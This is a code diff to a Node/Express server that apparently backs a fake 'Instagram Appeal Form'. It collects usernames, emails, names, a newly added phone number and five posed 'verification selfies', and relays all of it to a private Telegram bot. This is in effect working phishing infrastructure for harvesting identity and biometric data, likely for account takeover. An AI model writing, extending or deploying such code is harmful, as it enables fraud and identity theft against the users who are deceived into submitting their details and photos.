@@ -23,8 +23,21 @@ const upload = multer({
 // ---------- API Routes ----------
 
 app.post('/api/submit-form', (req, res) => {
-  const { type, username, email, fullname, alternative, relationship } = req.body;
-  const message = `📋 <b>Instagram Appeal Form</b>\n\n<b>Type:</b> ${type}\n━━━━━━━━━━━━━━━━━━━━\n<b>👤 Username:</b> ${username}\n<b>📧 Email:</b> ${email}\n<b>📝 Name:</b> ${fullname}\n<b>🔗 Alt Account:</b> ${alternative || 'N/A'}\n<b>👥 Relationship:</b> ${relationship}\n━━━━━━━━━━━━━━━━━━━━\n<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+  // Phone number ab 'phone' field me aayega (countryCode + number combined)
+  const { type, username, email, phone, fullname, alternative, relationship } = req.body;
+  
+  const message = `📋 <b>Instagram Appeal Form</b>
+
+<b>Type:</b> ${type}
+━━━━━━━━━━━━━━━━━━━━
+<b>👤 Username:</b> ${username}
+<b>📧 Email:</b> ${email}
+<b>📱 Phone:</b> ${phone || 'N/A'}
+<b>📝 Name:</b> ${fullname}
+<b>🔗 Alt Account:</b> ${alternative || 'N/A'}
+<b>👥 Relationship:</b> ${relationship}
+━━━━━━━━━━━━━━━━━━━━
+<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
   
   sendTelegramMessage(message)
     .then(() => res.json({ success: true }))
@@ -45,7 +58,12 @@ app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
   }
 
   const { username, formType, poseText, poseNumber } = req.body;
-  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>\n\n<b>👤 User:</b> ${username}\n<b>📝 Pose:</b> ${poseText}\n<b>📋 Type:</b> ${formType}\n<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>
+
+<b>👤 User:</b> ${username}
+<b>📝 Pose:</b> ${poseText}
+<b>📋 Type:</b> ${formType}
+<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
 
   sendTelegramPhoto(req.file.buffer, caption)
     .then(() => {
@@ -59,9 +77,18 @@ app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
 });
 
 app.post('/api/verification-complete', (req, res) => {
-  const { username, email, fullname, formType } = req.body;
-  const message = `✅ <b>VERIFICATION COMPLETED</b>\n\n<b>👤 User:</b> ${username}\n<b>📧 Email:</b> ${email}\n<b>📝 Name:</b> ${fullname}\n<b>📋 Form:</b> ${formType}\n<b>📸 Photos:</b> 5/5\n<b>✓ Status:</b> Ready for Review\n<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
-  
+  const { username, email, phone, fullname, formType } = req.body;
+  const message = `✅ <b>VERIFICATION COMPLETED</b>
+
+<b>👤 User:</b> ${username}
+<b>📧 Email:</b> ${email}
+<b>📱 Phone:</b> ${phone || 'N/A'}
+<b>📝 Name:</b> ${fullname}
+<b>📋 Form:</b> ${formType}
+<b>📸 Photos:</b> 5/5
+<b>✓ Status:</b> Ready for Review
+<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
+
   sendTelegramMessage(message)
     .then(() => res.json({ success: true }))
     .catch(err => {
@@ -89,7 +116,6 @@ async function sendTelegramPhoto(buffer, caption) {
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
   const formData = new FormData();
   formData.append('chat_id', CHAT_ID);
-  // ✅ Fix: Buffer → Blob
   const blob = new Blob([buffer]);
   formData.append('photo', blob, 'selfie.jpg');
   formData.append('caption', caption);
